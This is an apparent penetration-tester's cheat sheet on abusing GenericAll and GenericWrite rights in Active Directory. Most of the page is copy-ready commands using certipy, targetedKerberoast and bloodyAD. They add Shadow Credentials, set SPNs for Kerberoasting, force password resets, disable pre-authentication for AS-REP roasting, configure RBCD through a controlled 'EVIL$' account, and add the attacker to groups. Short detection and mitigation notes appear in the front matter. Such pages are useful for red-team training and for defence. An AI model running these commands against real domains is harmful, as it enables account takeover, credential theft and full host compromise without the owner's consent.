---
title: GenericAll / GenericWrite
category: AD / ACL abuse
order: 20
tags: [genericall, genericwrite, bloodyad, rbcd, spn, acl]
summary: >
  Broad write rights over an object. What you do with them depends on the object
  type: user → shadow creds / SPN / reset; computer → RBCD / shadow creds;
  group → add a member.
prerequisites:
  - GenericAll or GenericWrite over the target (from BloodHound)
  - LDAP reach to a DC ($dc_ip)
tools: [bloodyAD, impacket, PowerView, pyWhisker, targetedKerberoast]
detection:
  - 5136 modifications to servicePrincipalName, msDS-KeyCredentialLink, msDS-AllowedToActOnBehalfOf…, member
mitigation:
  - Remove the ACE; monitor writes to these attributes on sensitive objects
refs:
  - { label: "The Hacker Recipes — DACL", url: "https://www.thehacker.recipes/ad/movement/dacl" }
---

## On a user

Pick the quietest that fits — Shadow Credentials needs PKINIT; targeted
Kerberoast needs a crackable password; a reset is loud but always works.

```sh
# Shadow Credentials (preferred): add a key, get a cert, auth as them
certipy shadow auto -u $user@$domain -p $password -account $target_user -dc-ip $dc_ip
# Targeted Kerberoast: set an SPN, roast, remove the SPN
targetedKerberoast.py -v -d $domain -u $user -p $password
```

```sh
# bloodyAD building blocks
bloodyAD -u $user -p $password -d $domain --host $dc_ip set password $target_user 'NewPass123!'
bloodyAD -u $user -p $password -d $domain --host $dc_ip add uac $target_user -f DONT_REQ_PREAUTH   # then AS-REP roast
```

## On a computer

```sh
# RBCD — make a controlled account able to impersonate to this host
bloodyAD -u $user -p $password -d $domain --host $dc_ip add rbcd $target_computer 'EVIL$'
# or Shadow Credentials on the computer, then PKINIT + S4U
certipy shadow auto -u $user@$domain -p $password -account $target_computer -dc-ip $dc_ip
```

## On a group

```sh
# add yourself (or a controlled account) to the group
bloodyAD -u $user -p $password -d $domain --host $dc_ip add groupMember "$target_user" $user
```

> `GenericWrite` on a computer is a full host takeover via RBCD — treat any such
> edge to a server as Tier-0-adjacent.
